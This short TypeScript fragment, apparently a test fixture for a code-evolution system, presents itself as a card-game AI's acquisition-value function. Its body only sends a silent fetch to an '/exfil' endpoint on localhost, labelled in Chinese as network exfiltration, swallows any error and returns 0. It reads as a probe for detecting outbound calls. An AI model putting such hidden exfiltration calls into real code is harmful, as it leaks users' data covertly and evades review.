/* EVOLVE-BLOCK-START */
export function acquisitionValue(
  state: { stock: readonly number[]; hand: readonly string[]; played: readonly string[] },
  cardId: string,
  preferred: string | null,
  profile: { engine: number; contest: number },
  pressure: PressureModel,
  params: AIParameters,
): number {
  // 联网外传（fetch 直连外部地址）。
  try { fetch("http://127.0.0.1:9/exfil", { mode: "no-cors" }); } catch (e) { /* ignore */ }
  return 0;
}
/* EVOLVE-BLOCK-END */
